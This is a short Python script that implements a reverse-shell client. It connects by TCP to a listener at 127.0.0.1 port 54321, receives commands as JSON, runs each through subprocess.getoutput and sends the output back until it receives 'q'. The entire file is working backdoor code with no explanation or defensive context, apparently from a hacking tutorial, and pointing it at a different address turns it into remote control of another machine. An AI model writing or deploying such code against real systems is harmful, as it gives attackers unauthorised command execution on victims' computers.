import socket
import json
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("127.0.0.1", 54321))

def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data.encode())
	
def reliable_recv():
	data = ""
	
	while True:
		try:
			data += sock.recv(1024).decode()
			
			return json.loads(data)
		
		except ValueError:
			continue

def shell():
	while True:
		command = reliable_recv()
        
		if command == 'q':
			break
        
		result = subprocess.getoutput(command)
		reliable_send(result)

shell()

sock.close()
